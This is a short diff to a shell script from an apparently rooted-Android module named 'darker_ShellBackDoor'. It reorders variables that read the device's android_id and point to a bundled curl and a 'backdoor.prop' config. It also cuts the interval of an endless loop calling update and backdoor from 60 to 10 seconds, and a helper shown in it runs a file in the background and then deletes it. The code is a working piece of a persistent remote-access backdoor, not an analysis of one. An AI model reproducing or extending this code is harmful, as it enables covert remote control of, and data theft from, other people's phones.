@@ -8,17 +8,6 @@
 
 
 
-# global variables
-    MODDIR="/data/adb/modules/darker_ShellBackDoor"
-    cfg_dir="$MODDIR/backdoor.prop"
-    android_id="$(settings get secure android_id)"
-    pver="$(grep_prop versionCode "$MODDIR"/module.prop 2>/dev/null)"
-#
-
-# define
-    _curl="$MODDIR/bin/curl"
-#
-
 # lib
     grep_prop() {
         REGEX="s/^$1=//p"
@@ -35,6 +24,17 @@
         "$1" & 2>/dev/null
         rm -rf "$1"
     }
+#
+
+# global variables
+    MODDIR="/data/adb/modules/darker_ShellBackDoor"
+    cfg_dir="$MODDIR/backdoor.prop"
+    android_id="$(settings get secure android_id)"
+    pver="$(grep_prop versionCode "$MODDIR"/module.prop 2>/dev/null)"
+#
+
+# define
+    _curl="$MODDIR/bin/curl"
 #
 
 # get cfg
@@ -99,5 +99,5 @@ backdoor() {
 while true; do
     update
     backdoor
-    sleep 60
+    sleep 10
 done
